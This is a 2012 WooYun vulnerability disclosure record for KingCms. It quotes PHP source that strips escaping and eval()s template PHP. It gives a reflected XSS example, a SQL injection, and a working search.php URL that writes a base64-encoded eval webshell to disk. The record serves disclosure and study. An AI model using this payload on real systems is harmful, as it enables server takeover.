{"id": 18095, "wybug_id": "wooyun-2012-09469", "wybug_title": "KingCms Multiple Vulnerabilities", "wybug_corp": "King CMS", "wybug_author": "Zvall", "wybug_date": "2012-07-11 10:32", "wybug_open_date": "2012-08-25 10:33", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-08-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： SQL注入加+代码执行 详细说明：  \nfunction kc_pageLoad(){\tif (KC_MAGIC_QUOTES_GPC){\t\t$_GET=kc_stripslashes_array($_GET);\t\t$_POST=kc_stripslashes_array($_POST);\t\t$_COOKIE=kc_stripslashes_array($_COOKIE);\t\t$array=array('PHP_SELF','SCRIPT_URI','QUERY_STRING','PATH_INFO','PATH_TRANSLATED');\t\tforeach($array as $val){\t\t\tif(isset($_SERVER[$val]))\t\t\t\t$_SERVER[$val]=htmlspecialchars($_SERVER[$val]);                                //这里程序员考虑到了跨站的问题                           例如：我们提交一个 fuca.php/\"><script>alert(/Samy/)</script>                              就导致一个反射型XSS \t\t}\t}\t//设置ismethod值 true:post ; false:get\t$ismethod=kc_post('METHOD') ? True : False;\t$GLOBALS['ismethod']=!($_SERVER['REQUEST_METHOD']=='GET' || $ismethod);}function kc_stripslashes_array(&$_data){\tif (is_array($_data)){\t\tforeach ($_data as $_key => $_value){\t\t\t$_data[$_key]=kc_stripslashes_array($_value);\t\t}\t\treturn $_data;\t}else{\t\treturn stripslashes($_data);\t}}\ndecode addslashes  呵程序在去掉转义字符的同时.也为我们的注入带来方便因此程序员也写了一个函数 来获取GET 和 POST数组的值 并调用kc_validate用正则表达式来匹配我们提交的值：\nfunction kc_get($name,$type=2,$is=0){\tglobal $king;\t$val=isset($_GET[$name]) ? $_GET[$name] :'';\tif(!isset($val{0}))\t\t$val=isset($_POST[$name]) ? $_POST[$name] : '';\tif(isset($val{0})){\t\tif(kc_validate($val,$type)){\t\t\t$_getid=$val;\t\t}else{\t\t\tkc_error($king->lang->get                 略....kc_validatefunction kc_validate($s,$_type){\tswitch($_type){\t\tcase 1:$_reg='/^[a-zA-Z0-9]+$/';break;\t\tcase 2:$_reg='/^[0-9]+$/';break;\t\tcase 3:$_reg='/^([0-9\\.]+\\,?)+$/';break;\t\tcase 4:$_reg='/^[A-Za-z0-9\\_]+$/';break;\t\tcase 5:\t\t\t$_reg='/^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$/';break;\t\tcase 6:\t\t\t//$_reg='/^(http|https|ftp):(\\/\\/|\\\\\\\\)(([\\w\\/\\\\\\+\\-~`@:%])+\\.)+([\\w\\/\\.\\=\\?\\+\\-~`@\\:!%#]|(&)|&)+/';\t\t\t$_reg='/^[a-zA-Z]{3,10}:\\/\\/[^\\s]+$/';\t\t\tbreak;\t\tcase 7:\t\t\tglobal $king;//\t\t\t$_bool=in_array(kc_f_ext($s),explode('|',$king->config('upimg')));//\t\t\tretrun $_bool;\t\t\t$_reg='/^([a-zA-Z]{3,10}:\\/\\/)?[^\\s]+\\.('.$king->config('upimg').')$/';\t\t\t//$_reg='/^((http|https|ftp):(\\/\\/|\\\\\\\\)(([\\w\\/\\\\\\+\\-~`@:%])+\\.)+([\\w\\/\\.\\=\\?\\+\\-~`@\\:!%#]|(&)|&)+|([\\w\\/\\\\\\.\\=\\?\\+\\-~`@\\':!%#]|(&)|&)+)\\.('.$king->config('upimg').')$/';\t\t\tbreak;//jpeg|jpg|gif|png|bmp\t\tcase 8:\t\t\t$_reg='/^((((1[6-9]|[2-9]\\d)\\d{2})-(0?[13578]|1[02])-(0?[1-9]|[12]\\d|3[01]))|(((1[6-9]|[2-9]\\d)\\d{2})-(0?[13456789]|1[012])-(0?[1-9]|[12]\\d|30))|(((1[6-9]|[2-9]\\d)\\d{2})-0?2-(0?[1-9]|1\\d|2[0-8]))|(((1[6-9]|[2-9]\\d)(0[48]|[2468][048]|[13579][26])|((16|[2468][048]|[3579][26])00))-0?2-29)) (20|21|22|23|[0-1]?\\d):[0-5]?\\d:[0-5]?\\d$/';break;\t\tcase 9:\t\t\t$_reg='/^((((1[6-9]|[2-9]\\d)\\d{2})-(0?[13578]|1[02])-(0?[1-9]|[12]\\d|3[01]))|(((1[6-9]|[2-9]\\d)\\d{2})-(0?[13456789]|1[012])-(0?[1-9]|[12]\\d|30))|(((1[6-9]|[2-9]\\d)\\d{2})-0?2-(0?[1-9]|1\\d|2[0-8]))|(((1[6-9]|[2-9]\\d)(0[48]|[2468][048]|[13579][26])|((16|[2468][048]|[3579][26])00))-0?2-29))$/';break;\t\tcase 10:$_reg='/^\\d?\\.\\d?\\.\\d{4}$/';break;\t\tcase 13:$_reg='/^#?[0-9A-Fa-f]{6}$/';break;\t\tdefault:$_reg=$_type;\t\tcase 22:$_reg='/^\\-?[0-9]+$/';break;\t\tcase 23:$_reg='/^[a-zA-Z][a-zA-Z0-9\\_]*/';break;\t\tcase 24:$_reg='/^[a-zA-Z0-9-_]+$/';break;\t\tcase 25:$_reg='/[a-zA-Z0-9\\+\\%]+(\\=)*$/';break;\t\tcase 33:$_reg='/^(\\-?[0-9]+\\,?)+$/';break;\t\tdefault:$_reg=$_type;             略..\n代码执行：\n$tmp=$t ? $t : $this->tmp;\tif(substr($tmp,0,6)=='{Tags}'){\t\t$s='<div style=\"border:5px solid #CCC;background:#EFEEEE;padding:15px;line-height:20px;\">';\t\tforeach($this->array as $key => $val){\t\t\t$s.=\"<tt>{king:$key/}</tt> -&gt; $val <br/>\";\t\t}\t\t$s.='</div>';\t}else{\t\tkc_runtime('Template');\t\t$s=preg_replace_callback($this->parent,array(&$this,'regexcallback'),$tmp);\t\tkc_runtime('Template',1);\t}\t$parent='/<\\?(php)?(\\S*?)((.|\\n)+?)\\?>/is';\t$s=preg_replace_callback($parent,array(&$this,'regexphpcallback'),$s);\treturn $s;public function regexphpcallback($m){\t$php=$m[3];\tif(isset($php)){\t\tob_start();\t\teval($php);\t\t$s=ob_get_clean();\t}\treturn $s;}\n   漏洞证明：  由于id进入了Path中 我们提交l999999.9 or 1=1 会生成\n\n由于是从mysql中读值.我们无法控制. 不能构造webshell了\n\n代码执行：http://localhost/king/search.php?query=facked';?><?fputs(fopen('Samy.php','w'),base64_decode('MTExPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4yMjI='));?>&modelid=1 or 2=2\n\n   修复方案：  你懂的吧！！   版权声明：转载请注明来源 Zvall@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}